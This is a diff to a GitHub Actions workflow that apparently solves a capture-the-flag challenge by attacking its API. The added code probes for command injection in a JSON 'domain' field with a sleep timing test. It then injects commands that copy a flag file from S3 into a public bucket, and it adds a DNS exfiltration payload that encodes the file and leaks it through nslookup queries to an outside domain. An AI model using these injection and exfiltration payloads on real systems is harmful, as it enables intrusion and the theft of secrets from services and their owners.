@@ -7,6 +7,10 @@ on:
         description: "Exact challenge API URL from the provided site, for example https://.../stage/path"
         required: false
         type: string
+      exfil_domain:
+        description: "Optional domain you control for DNS exfil, for blind command output only"
+        required: false
+        type: string
   push:
     branches:
       - corgi
@@ -114,6 +118,7 @@ jobs:
           out_key="faith-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.txt"
           exfil_url="s3://${public_bucket}/${out_key}"
           command="example.com; /opt/aws s3 cp s3://${flag_bucket}/flag.txt ${exfil_url}; #"
+          sleep_command="example.com; sleep 6; #"
 
           echo "== Read provided challenge site for API route =="
           curl -ksS -m 10 "${site_base}/index.html" -o out/site-index.html || true
@@ -131,6 +136,9 @@ jobs:
 
           echo "== Using API URL: $api_url =="
 
+          echo "== Direct flag read as cicdRole, expected to fail unless object ACL allows it =="
+          aws s3 cp "s3://${flag_bucket}/flag.txt" - || true
+
           check_flag() {
             if aws s3api head-object --bucket "$public_bucket" --key "$out_key" >/dev/null 2>&1; then
               echo "== Exfil succeeded: s3://${public_bucket}/${out_key} =="
@@ -140,7 +148,27 @@ jobs:
             return 1
           }
 
-          echo "== Calling exact challenge API URL =="
+          echo "== Timing test for command injection =="
+          python3 - "$api_url" "$sleep_command" <<'PY'
+import json
+import sys
+import time
+import urllib.request
+
+url, domain = sys.argv[1], sys.argv[2]
+body = json.dumps({"domain": domain}).encode()
+req = urllib.request.Request(url, data=body, headers={"content-type": "application/json"}, method="POST")
+start = time.time()
+try:
+    with urllib.request.urlopen(req, timeout=12) as resp:
+        print(resp.read().decode("utf-8", "replace"))
+except Exception as exc:
+    print(f"request error: {exc}")
+elapsed = time.time() - start
+print(f"elapsed_seconds={elapsed:.2f}")
+PY
+
+          echo "== Calling exact challenge API URL with S3 copy attempt =="
           curl -ksS -m 10 -X POST \
             -H 'content-type: application/json' \
             --data "{\"domain\":\"${command}\"}" \
@@ -151,10 +179,24 @@ jobs:
             exit 0
           fi
 
-          echo "== Exfil object not found after scoped API call =="
+          echo "== Exfil object not found after scoped S3 copy attempt =="
           aws s3api list-objects-v2 --bucket "$public_bucket" \
             --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
             --output table || true
+
+          exfil_domain="${{ github.event.inputs.exfil_domain }}"
+          if [[ -n "$exfil_domain" ]]; then
+            echo "== DNS exfil using participant-provided domain: $exfil_domain =="
+            dns_command="example.com; v=\$(/opt/aws s3 cp s3://${flag_bucket}/flag.txt - 2>/dev/null | base64 | tr -d '=+/\\n' | tr '[:upper:]' '[:lower:]'); /opt/nslookup \${v}.${exfil_domain}; #"
+            curl -ksS -m 10 -X POST \
+              -H 'content-type: application/json' \
+              --data "{\"domain\":\"${dns_command}\"}" \
+              "$api_url" || true
+            echo
+            echo "Check authoritative DNS logs for a query ending in .$exfil_domain"
+          else
+            echo "No DNS exfil domain provided. If timing confirms injection and S3 copy fails, rerun with exfil_domain set to an authorized domain you control."
+          fi
           exit 1
 
       - name: Probe command injection
